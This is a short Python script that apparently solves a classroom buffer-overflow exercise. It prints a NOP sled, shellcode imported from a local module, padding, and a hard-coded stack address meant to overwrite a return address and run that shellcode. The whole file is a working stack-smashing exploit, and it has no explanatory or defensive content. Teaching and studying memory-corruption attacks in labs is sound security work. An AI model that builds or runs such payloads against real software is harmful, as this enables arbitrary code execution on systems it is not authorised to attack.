#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
# fffed89c fffed8fc fffed828
for i in range(200):
	sys.stdout.buffer.write(pack("<I", 0x90909090))

sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(pack("<B", 0x33))

for i in range(51):
	sys.stdout.buffer.write(pack("<I", 0x90909090))

sys.stdout.buffer.write(pack("<I", 0xfffed555))
